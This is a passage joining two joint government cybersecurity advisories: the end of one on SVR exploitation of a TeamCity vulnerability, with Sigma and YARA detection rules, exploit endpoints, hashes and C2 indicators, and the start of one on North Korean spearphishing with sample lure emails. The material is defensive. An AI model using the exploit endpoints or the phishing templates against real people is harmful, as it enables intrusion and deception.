- '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'
- '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'
- '\\WindowUpdate'
- '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'
- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'
- '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'
- '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'
- '\\Microsoft\\Windows\\Data Integrity Scan\Data Integrity Update'
- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'
- '\\Microsoft\\Windows\\ATPUpd'
- '\\Microsoft\\Windows\\Windows Defender\\Service Update'
- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'
- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'
- '\\Defender'
- '\\defender'
condition: selection
title: Scheduled tasks names used by SVR for GraphicalProton backdoor
description: Hunts for known SVR-specific scheduled task names
author:
references:
date: 2023/11/15
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith:
- 'schtasks.exe'
CommandLine|contains:
- 'IISUpdateService'
- 'WindowsDefenderService'
- 'WindowsDefenderService2'
- 'DefenderService'
- 'DefenderUPDService'
- 'WiMSDFS'
- 'StartupAppTaskCkeck'
- 'SubmitReporting'
- 'Defender Update Service'
- 'WindowUpdate'
- 'CheckReporting'
- 'StartupAppTaskCheck'
- 'SpeechModelInstallTask'
- 'BfeOnServiceStart'
- 'Data Integrity Update'
- 'Scheduled AutoCheck'
- 'ATPUpd'
Page 19 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
- 'Service Update'
- 'Scheduled Check'
- 'Scheduled AutoCheck'
- 'Defender'
- 'defender'
selection_re:
Image|endswith:
- 'schtasks.exe'
CommandLine|re:
- '.*Defender\sUpdate\sService.*'
- '.*Data\sIntegrity\sUpdate.*'
- '.*Scheduled\sAutoCheck.*'
- '.*Service\sUpdate.*'
- '.*Scheduled\sCheck.*'
- '.*Scheduled\sAutoCheck.*'
condition: selection or selection_re
title: Suspicious registry modifications
description: Suspicious registry modifications
author:
references:
date: 2023/11/15
logsource:
category: registry_set
product: windows
detection:
selection:
EventID: 4657
TargetObject|contains:
- 'CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin'
- 'CurrentControlSet\\Control\\Lsa\\NoLMHash'
condition: selection
title: Registry modification from cmd
description: Registry modification from cmd
author:
references:
date: 2023/11/15
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith:
- 'reg.exe'
CommandLine|contains|all:
- 'CurrentControlSet'
- 'Lsa'
Page 20 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
CommandLine|contains:
- 'DisableRestrictedAdmin'
- 'NoLMHash'
condition: selection
title: Malicious Driver Load
description: Detects the load of known malicious drivers via their names or hash.
references:
- https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection
author:
date: 2023/11/15
logsource:
category: driver_load
product: windows
detection:
selection_name:
ImageLoaded|endswith:
- 'RTCore64.sys'
- 'DBUtils_2_3.sys'
selection_hash:
Hashes|contains:
- '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'
- '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'
condition: selection_name or selection_hash
YARA rules
The following rule detects most known GraphicalProton variants.
rule APT29_GraphicalProton {
strings:
// C1 E9 1B
ecx, 1Bh
// 48 8B 44 24 08
rax, [rsp+30h+var_28]
// 8B 50 04
edx, [rax+4]
// C1 E2 05
edx, 5
// 09 D1
ecx, edx
// 48 8B 44 24 08
rax, [rsp+30h+var_28]
$op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 |
08 | 10 | 0d | 07) 09 ?? 48 }
// 48 05 20 00 00 00
// 48 89 C1
// 48 8D 15 0A A6 0D 00
// 41 B8 30 00 00 00
// E8 69 B5 FE FF
// 48 8B 44 24 30
// 48 05 40 00 00 00
// 48 89 C1
// 48 8D 15 1B A6 0D 00
// 41 B8 70 01 00 00
// E8 49 B5 FE FF
// 48 8B 44 24 30
call
call
rax, 20h ; ' '
rcx, rax
rdx, unk_14011E546
r8d, 30h ; '0'
sub_14002F4B0
rax, [rsp+88h+var_58]
rax, 40h ; '@'
rcx, rax
rdx, unk_14011E577
r8d, 170h
sub_14002F4B0
rax, [rsp+88h+var_58]
Page 21 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
// 48 05 60 00 00 00
rax, 60h ; '`'
// 48 89 C1
rcx, rax
// 48 8D 15 6C A7 0D 00
rdx, unk_14011E6E8
// 41 B8 2F 00 00 00
r8d, 2Fh ; '/'
// E8 29 B5 FE FF
call
sub_14002F4B0
// 48 8B 44 24 30
rax, [rsp+88h+var_58]
// 48 05 80 00 00 00
rax, 80h
// 48 89 C1
rcx, rax
// 48 8D 15 7C A7 0D 00
rdx, unk_14011E718
// 41 B8 2F 00 00 00
r8d, 2Fh ; '/'
// E8 09 B5 FE FF
call
sub_14002F4B0
// 48 8B 44 24 30
rax, [rsp+88h+var_58]
// 48 05 A0 00 00 00
rax, 0A0h
$op_decrypt_config = {
48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]
48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]
48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]
48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]
48 05 A0 00 00 00
condition:
all of them
Note: These rules are meant for threat hunting and have not been tested on a larger dataset.
MITIGATIONS
The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of
this campaign poses a threat to public safety and recommend organizations implement the mitigations
below to improve organization
s cybersecurity posture. These mitigations align with the Cross-Sector
Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards
and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and
NIST recommend all organizations implement. CISA and NIST based the CPGs on existing
cybersecurity frameworks and guidance to protect against the most common and impactful threats,
tactics, techniques, and procedures. Visit CISA
s Cross-Sector Cybersecurity Performance Goals for
more information on the CPGs, including additional recommended baseline protections.
Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in midSeptember 2023, if not already completed.
Monitor the network for evidence of encoded commands and execution of network scanning
tools.
Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if
monitoring or reporting is disabled, or if communication is lost with a host agent for more than a
reasonable amount of time.
Require use of multi-factor authentication [CPG 1.3] for all services to the extent possible,
particularly for email, virtual private networks, and accounts that access critical systems.
Page 22 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Organizations should adopt multi-factor authentication (MFA) as an additional layer of
security for all users with access to sensitive data. Enabling MFA significantly reduces the
risk of unauthorized access, even if passwords are compromised.
Keep all operating systems, software, and firmware up to date. Immediately configure
newly-added systems to the network, including those used for testing or development work, to
follow the organization
s security baseline and incorporate into enterprise monitoring tools.
Audit log files to identify attempts to access privileged certificates and creation of fake identity
providers.
Deploy software to identify suspicious behavior on systems.
Deploy endpoint protection systems with the ability to monitor for behavioral indicators of
compromise.
Use available public resources to identify credential abuse with cloud environments.
Configure authentication mechanisms to confirm certain user activities on systems, including
registering new devices.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend
exercising, testing, and validating your organization's security program against the threat behaviors
mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW,
CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how
they perform against the ATT&CK techniques described in this advisory.
To get started:
Select an ATT&CK technique described in this advisory (see previous tables).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies
 performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance
data.
6. Tune your security program, including people, processes, and technologies, based on the
data generated by this process.
FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security
program, at scale, in a production environment to ensure optimal performance against the MITRE
ATT&CK techniques identified in this advisory.
REFERENCES
FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR)
Cyber Operations: Trends and Best Practices for Network Defenders
NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied
Networks
CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365
Compromise
Page 23 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud
Environments
CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies,
Critical Infrastructure, and Private Sector Organizations
CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber
Activity
FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S.
Think Tanks
CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development
NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development
The information in this report is being provided 
as is
 for informational purposes only. FBI, CISA,
NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or
service, including any entities, products, or services linked within this document. Any reference to
specific commercial entities, products, processes, or services by service mark, trademark,
manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring
by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.
VERSION HISTORY
December 13, 2023: Initial version.
Page 24 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
APPENDIX A 
 INDICATORS OF COMPROMISE CVE-2023-42793
On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log
message when an attacker modified the internal.properties file. There will also be a log message
for every process created via the /app/rest/debug/processes endpoint. In addition to showing the
command line used, the user ID of the user account whose authentication token was used during the
attack is also shown. For example:
[2023-09-26 11:53:46,970]
INFO - ntrollers.FileBrowseController - File
edited: C:\ProgramData\JetBrains\TeamCity\config\internal.properties by
user with id=1
[2023-09-26 11:53:46,970]
INFO - s.buildServer.ACTIVITIES.AUDIT server_file_change: File
C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified
by "user with id=1"
[2023-09-26 11:53:58,227]
INFO - tbrains.buildServer.ACTIVITIES External process is launched by user user with id=1. Command line: cmd.exe
"/c whoami"
An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity
logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP
proxy may have suitable logs showing the following target endpoints being accessed:
/app/rest/users/id:1/tokens/RPC2 
 This endpoint is required to exploit the vulnerability.
/app/rest/users 
 This endpoint is only required if the attacker wishes to create an arbitrary
user.
/app/rest/debug/processes 
 This endpoint is only required if the attacker wishes to create
an arbitrary process.
Note: The user ID value may be higher than 1.
Page 25 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
APPENDIX B 
 IOCS
File IoCs
GraphicalProton backdoor:
01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732
34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E
620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869
773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13
7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53
8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7
971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43
EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E
F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB
C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4
4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166
GraphicalProton HTTPS backdoor:
18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93
19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641
1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8
219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67
92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6
B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7
C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD
C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0
C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3
F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69
Backdoored vcperf:
D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443
Backdoored Zabbix installation archive:
4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F
Backdoored Webroot AV installation archive:
950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4
Modified rsockstun
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
Network IoCs
Page 26 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Tunnel Endpoints
65.20.97[.]203
65.21.51[.]58
Exploitation Server
103.76.128[.]34
GraphicalProton HTTPS C2 URL:
hxxps://matclick[.]com/wp-query[.]php
Page 27 of 27 | Product ID: AA23-347A
TLP:CLEAR
Co-Authored by:
TLP:CLEAR
Product ID: CSA-20230601-1
June 1, 2023
North Korea Using Social Engineering to Enable
Hacking of Think Tanks, Academia, and Media
SUMMARY
The Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security
Agency (NSA), together with the Republic of Korea
s National Intelligence Service (NIS), National
Police Agency (NPA), and Ministry of Foreign Affairs (MOFA), are jointly issuing this advisory to
highlight the use of social engineering by Democratic People
s Republic of Korea (DPRK a.k.a. North
Korea) state-sponsored cyber actors to enable computer network exploitation (CNE) globally against
individuals employed by research centers and think tanks, academic institutions, and news media
organizations. These North Korean cyber actors are known to conduct spearphishing campaigns
posing as real journalists, academics, or other individuals with credible links to North Korean policy
circles. The DPRK employs social engineering to collect intelligence on geopolitical events, foreign
policy strategies, and diplomatic efforts affecting its interests by gaining illicit access to the private
documents, research, and communications of their targets.
BACKGROUND
North Korea
s cyber program provides the regime with broad intelligence collection and espionage
capabilities. The Governments of the United States and the Republic of Korea (ROK a.k.a. South
Korea) have observed sustained information-gathering efforts originating from these North Korean
cyber actors. North Korea
s primary military intelligence organization, the Reconnaissance General
Bureau (RGB), which has been sanctioned by the United Nations Security Council, is primarily
responsible for this network of actors and activities.
We assess the primary goals of the DPRK regime
s cyber program include maintaining consistent
access to current intelligence about the United States, South Korea, and other countries of interest to
impede any political, military, or economic threat to the regime
s security and stability.
Currently, the U.S. and ROK Governments, and private sector cyber security companies, track a
specific set of DPRK cyber actors conducting these large-scale social engineering campaigns as
Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR
when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and
procedures for public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed
without restriction. For more information on the Traffic Light Protocol, see https://www.cisa.gov/tlp.
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
Kimsuky, Thallium, APT43, Velvet Chollima, and Black Banshee. Kimsuky is administratively
subordinate to an element within North Korea
s RGB and has conducted broad cyber campaigns in
support of RGB objectives since at least 2012. Kimsuky actors
 primary mission is to provide stolen
data and valuable geopolitical insight to the North Korean regime.
Some targeted entities may discount the threat posed by these social engineering campaigns, either
because they do not perceive their research and communications as sensitive in nature, or because
they are not aware of how these efforts fuel the regime
s broader cyber espionage efforts. However,
as outlined in this advisory, North Korea relies heavily on intelligence gained by compromising policy
analysts. Further, successful compromises enable Kimsuky actors to craft more credible and effective
spearphishing emails that can be leveraged against more sensitive, higher-value targets. The
authoring agencies believe that raising awareness of some of these campaigns and employing basic
cyber security practices may frustrate the effectiveness of Kimsuky spearphishing operations. This
advisory provides detailed information on how Kimsuky actors operate; red flags to consider as you
encounter common themes and campaigns; and general mitigation measures for entities worldwide to
implement to better protect against Kimsuky
s CNE operations.
If you believe you have been targeted in one of these spearphishing campaigns, whether or not
it resulted in a compromise (particularly if you are a member of one of the targeted sectors),
please file a report with www.ic3.gov and reference #KimsukyCSA in the incident description.
Please include as much detail as you can about the incident including the sender email address
and the text of the email message, specifying any links/URLs/domains. Please specify whether
you responded to the email, clicked on any links, or opened any attachments. Please retain the
original email and attachments in case you are contacted by an investigator for further
information.
Please visit www.ic3.gov and use #KimsukyCSA in your submission.
The U.S. Government also encourages victims to report suspicious activities, including any
suspected DPRK cyber activities, to local FBI field offices.
For the ROK government, you can report suspicious activities to the National Intelligence
Service (www.nis.go.kr, 111), the National Police Agency (ecrm.police.go.kr, 182), or the Korea
Internet & Security Agency (boho.or.kr, 118)
Page 2 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
KIMSUKY OPERATIONS: SOCIAL ENGINEERING
In a cybersecurity context, social engineering is a broad term referring to the use of deception to
exploit human error and manipulate a target into unwittingly exposing confidential or sensitive
information for fraudulent purposes. DPRK cyber actors employ social engineering techniques to
enable much of Pyongyang
s malicious CNE. Among social engineering techniques, Kimsuky actors
use spearphishing
or the use of fabricated emails and digital communications tailored to deceive a
target
as one of their primary vectors for initiating a compromise and gaining access into a target
devices and networks. For over a decade, Kimsuky actors have continued to refine their social
engineering techniques and made their spearphishing efforts increasingly difficult to discern.
A Kimsuky spearphishing
campaign begins with
broad research and
preparation. DPRK cyber
actors often use opensource information to
identify potential targets of
value and then tailor their
online personas to appear
more realistic and
appealing to their victims.
Input Settings 
 Set specific input.
Caution: Check input settings for errors.
Sender Name
Sender Address
Recipient Address
Subject
The Kimsuky actors will
Date and Time
create email addresses
Destination Link
that resemble email
Creator Name
addresses of real
individuals they seek to
Sample of a program for generating DPRK spearphishing emails.
impersonate and generate
domains that host the
malicious content of a spearphishing message. DPRK actors often use domains that resemble
common internet services and media sites to deceive a target.
For example, Kimsuky actors are known to impersonate well-known news outlets and
journalists using a domain such as 
@XYZkoreas.news
 spoofing a real news station while
actual emails from the news service appear as 
@XYZnews.com.
DPRK cyber actors commonly take on the identities of real people to gain trust and establish
rapport in their digital communications. Kimsuky actors may have previously compromised the
email accounts of the person whom they are impersonating. This allows the actors to search
for targets while scanning through compromised emails, with a particular focus on workrelated files and personal information pertaining to retirees, social clubs, and contact lists.
They craft convincing spearphishing emails by repurposing the person
s email signature,
contact list, and past email exchanges. DPRK cyber actors are also known to compromise
Page 3 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
email accounts belonging to foreign policy experts and subsequently create a secondary email
account, using the email account and identity of the expert to communicate with other
significant targets.
In other cases, a Kimsuky actor will use multiple personas to engage a target; one persona to
conduct initial outreach and a second persona to follow-up on the first engagement to distract
a potential victim from discerning the identity of the original persona. Another tactic is to
resend
 or 
forward
 an email from a source trusted by a target.
The initial phishing email occasionally contains a malicious link or document, often purporting
to be a report or news article. These attached malicious documents are frequently passwordprotected, which helps them evade detection by antivirus software and other security
measures. However, more often, the initial spearphishing email does not contain any
malicious links or attachments and is instead intended to gain the trust of the victim.
Once DPRK cyber actors establish engagement with a target, the actors attempt to
compromise the account, device, or network belonging to the target by pushing malicious
content in the form of a malicious macro embedded within a text document. This document is
either attached directly to the email, or stored in a file hosting service, such as Google Drive or
Microsoft OneDrive. These malicious macros, when enabled, quietly establish connections
with Kimsuky command and control infrastructure, and result in the provision of access to the
target
s device.
In some cases, Kimsuky actors have developed 
spoofed
 or fake but realistic versions of
actual websites, portals, or mobile applications, and directed targets to input credentials and
other information that are harvested by the DPRK. Compromise of a target account can lead
to persistent access to a victim
s communications, often through a malware used by Kimsuky
actors called BabyShark. Kimsuky actors have also been known to configure a victim
s email
account to quietly auto-forward all emails to another actor-controlled email.
Notably, victim responses to spearphishing lures also provide Pyongyang with the added benefit of
insight into foreign policy circles. This covert collection against the community of DPRK watchers is
probably of high value to the Kim regime and provides another channel of information on top of what it
gains through computer network operations.
Although all DPRK advanced persistent threat groups employ social engineering techniques, the
campaigns and themes described in this advisory are specific to Kimsuky.
Page 4 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
RED FLAG INDICATORS
Sector targets should be aware of the following activity that may be indications or behaviors of
malicious DPRK cyber actors.
Initial communications are often seemingly innocuous with no malicious links/attachments;
follow-on communications usually contain malicious links/documents to facilitate exploitation
of a computer or network.
Email content may include real text of messages recovered from previous victim engagement
with other legitimate contacts.
Emails in English may sometimes have awkward sentence structure and/or incorrect
grammar.
Email content may contain a distinct Korean dialect exclusively used in North Korea.
Victims/targets with both direct and indirect knowledge of policy information i.e., U.S. and ROK
government employees/officials working on North Korea, Asia, China, Southeast Asia matters;
U.S. and ROK government employees with high clearance levels; and members of the
military, are approached with common themes and questions as referenced in this advisory.
Email domains look like a legitimate news media site, but do not match the domain of the
company
s official website. The domains also may be identified as such in open-source
malware repositories like Virus Total.
Spoofed email accounts have subtle incorrect misspellings of the names and email addresses
of the legitimate ones listed in a university directory or an official website.
Malicious documents require the user to click 
Enable Macros
 to view the document.
Actors are persistent if the target does not respond to the initial spearphishing email. They will
likely send a follow-up email within 2-3 days of initial contact.
Emails purporting to be from official sources but sent using unofficial email services.
Page 5 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
CAMPAIGNS AND THEMES
Kimsuky cyber actors craft their spearphishing campaigns around themes characterizing the target,
message content, and the malicious mechanism, or lure, through which a compromise is initiated.
The main themes to beware of are impersonations and targeting of journalists, academic scholars,
and think tank researchers to:
solicit responses to foreign policy-related inquiries,
conduct a survey,
request an interview,
review a document,
request a resume, or
offer payment for authoring a research paper.
Kimsuky actors tailor their themes to their target
s interests and will update their content to reflect
current events discussed among the community of North Korea watchers.
The following are examples of real Kimsuky spearphishing attempts that illustrate variations of the
common themes. In some instances, the cyber actor poses as a journalist and targets a think tank
researcher, while at other times, the DPRK actor may take on the persona of an academic scholar to
target other scholars
virtually every combination of these themes and lures has been previously
observed.
1. Impersonation of journalists
Kimsuky actors often spoof real journalists and broadcast writers to craft a credible front and make
inquiries to prominent individuals working North Korea matters. Usually, the questions will revolve
around current events and whether U.S. experts believe North Korea will re-join talks with the U.S.,
whether they believe North Korea will resume testing its missiles, and how they see China
responding. In many instances, Kimsuky actors do not attach malware to their initial email. Instead,
they first send an introductory email to inquire about interview opportunities.
Page 6 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 1:
Title: <name of legitimate Korean journal program>
Greetings,
My name is <name of writer>, and I am a writer for <name of legitimate Korean journal
program>.
I am writing to you today because I am currently preparing for a program related to North
Korean issues. Professor <name of professor> of <actual Korean university>, whom I
contacted earlier, recommended you as an expert on this issue. I would be grateful if you
could spare some time to answer a few questions.
Thank you for considering my request. I look forward to hearing from you soon.
Best regards,
Follow-on email: If the targets agree to the interview, the actors will then follow up with a second
email containing malicious content.
Title: RE: RE: <name of legitimate Korean journal program>
Dear <name of expert>,
As promised, I am sending you a questionnaire. It would be greatly appreciated if you could
answer each question in 4-5 sentences. Thank you for your cooperation.
Best regards,
@ attached file: [<name of legitimate Korean journal program>] questionnaire.docx
Additionally, we have seen Kimsuky actors spoof legitimate journalists to specifically target think tank
employees. Kimsuky actors commonly pose questions in their spearphishing emails about current
events, such as issues regarding Russia
s invasion of Ukraine; U.S.-DPRK relations; DPRK nuclear
and security topics; policymaker stances on the Asian region; and thoughts on current China-North
Korea and Russia-North Korea relations.
Page 7 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
TLP:CLEAR
Sample email communication 2:
Greetings,
I hope you've been well! This is <name of real journalist> with <legitimate U.S. news
organization>.
North Korea Fires Powerful Missile on 4 Oct using Old Playbook in a New Worlds. The last
time Pyongyang launched a weapon over Japan was in 2017, when Donald J. Trump was
president and Kim Jong-un seemed intent on escalating conflict with Washington.
I have some questions regarding this:
1) Would Pyongyang conduct its next nuclear test soon after China
s Communist Party
Congress in mid-October?
2) May a quieter approach to North Korean aggression be warranted?
3) Would Japan increase the defense budget and a more proactive defense policy?
I would be very grateful if you could send me your answers within 5 days.
Have a good weekend.
Sincerely,
<name of legitimate journalist>
2. Impersonation of academic scholars
Kimsuky actors impersonate South Korean academic scholars to send spearphishing emails to
researchers at think tanks. In these emails, the targets are asked to participate in a survey, such as
on North Korean nuclear issues and denuclearization on the Korean Peninsula or requesting an email
interview.
Page 8 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 3:
Title: <name of legitimate Korean think tank institute> Request for survey
Hello,
I am <name of an academic scholar> from <name of legitimate Korean think tank>.
I am reaching out to ask if you would be willing to participate in a survey on North Korea
nuclear development titled, 
A survey on the perception on experts on the advancement of
North Korean nuclear weapons and the denuclearization of the Korean Peninsula
. Our goal
is to find ways to resolve North Korean nuclear issues and achieve denuclearization on the
Korean Peninsula. Rest assured that all answers will be kept confidential and used solely for
research purpose. As a token of appreciation, we would like to offer 300,000 won to those
who participate in the survey. If you
re interested in participating, please reply to this
message, and we will send you the survey questionnaire. Looking forward to hearing from
you soon.
Best regards,
Follow-on email: Once targets respond to inquiries, Kimsuky actors send them a survey
questionnaire and a document form for payment, which contains malicious content.
Title: RE: RE: <name of legitimate Korean think tank institute> Request for survey
Thank you for your response.
We will send you a document form for payment, which includes a personal information
usage agreement. If possible, please fill out your affiliation, name, ID number, bank account,
and signature, and attach copies of your bankbook and ID card.
Best regards,
P.S. The attached document is password-protected, and I will send you the password in a
password.txt file
@ attached file: PersonalInformationUsageAgreement
Page 9 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 4:
Below is an example of Kimsuky actors pursuing responses to questions on sector targets by posing
as a university professor and research student. Once an initial response is received, actors will
request an email interview with a list of questions and request that targets access documents via a
malicious link to a cloud-hosted service.
To: <name of foreign affairs expert>
Subject: Re: Request for an interview
Dear <name of foreign affairs expert>, Sorry for my late response because of the Profs
busy time and thanks so much for replying me your kind answers. I did confer with
<legitimate U.S. University Professor >about it and modified a bit. Please find the link below
and let me know if you have the different opinions.
https: <malicious drive link>
PWD: <redacted>
Best, <fictitious university student>
To: <foreign affairs expert>
Cc: <scholar>
Dear <foreign affairs expert>, Thanks so much for your fast feedback. I did confer with
<legitimate U.S. university professor> again and complete it as your request. Please find
the updated below. https: <malicious drive link>
PWD: <redacted>
We're planning to upload it on our website within a week after final review. Please feel free
to contact with me if you have any questions.
Best, <fictitious university student>
3. Impersonation of think tank researchers
Kimsuky actors impersonate researchers from legitimate South Korean think tanks to send
spearphishing emails to political and North Korean experts. They initiate communication by sending
genuine emails to establish rapport and seek opinions on various topics, such as 
North Korea
foreign policy and our response.
Page 10 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 5:
Title: [Request for opinion] I
m <name of legitimate Korean think tank> <name of deputy
director>
Greetings,
I am <name of legitimate Korean think tank>, deputy director of the <name of deputy
director>.
I am reaching out to you to discuss an article I am currently working on.
The topic, 
North Korea
s foreign policy and South Korea
s response
 is somewhat distant
from my expertise, so I would greatly appreciate hearing the opinions of experts like you.
I would kindly request your comments on my writing, as I believe you are the most
appropriate person to provide valuable insights on the subject. Your earlier article caught my
attention, and I found myself nodding in agreement with each sentence. That is why I feel
confident in asking for your opinion.
I am eagerly awaiting your reply and appreciate your willingness to assist me. Thank you for
your time and consideration.
Best regards,
Follow-on email: After receiving replies from their targets, the Kimsuky actors exchange multiple
emails, which may include attachments containing malicious links or files and instructions on how to
open the attached files. Even after stealing the account information of their victims and infecting their
devices with malware, they sometimes continue to send 
thank you
 emails to their targets.
Title: RE: RE: [Request for opinion] I
m <name of legitimate Korean think tank> <name of
deputy director> <attached large size file>
Thank you for agreeing to provide your opinion. Please find the attached files.
We greatly appreciate your input. To ensure security in the face of increasing hacking
activity, we have set a password (<password string>) for the attached file.
We look forward to hearing your valuable feedback.
Page 11 of 21 | Product ID: CSA-20230601-1
TLP:CLEAR
TLP:CLEAR
FBI | DOS | NSA| NIS | NPA | MOFA
Sample email communication 6:
Below is an example of Kimsuky actors spoofing a think tank employee and utilizing a spoofed think
tank domain in order to target another think tank employee. Once the target responds with input, the
Kimsuky actor sends a follow-on email with a malicious attachment.
Dear <think tank employee>,
Hope you are doing well. On behalf of <another think tank>, it is my pleasure to invite you
to write a 1,200-word piece on the recent NK's provocation.
North Korea
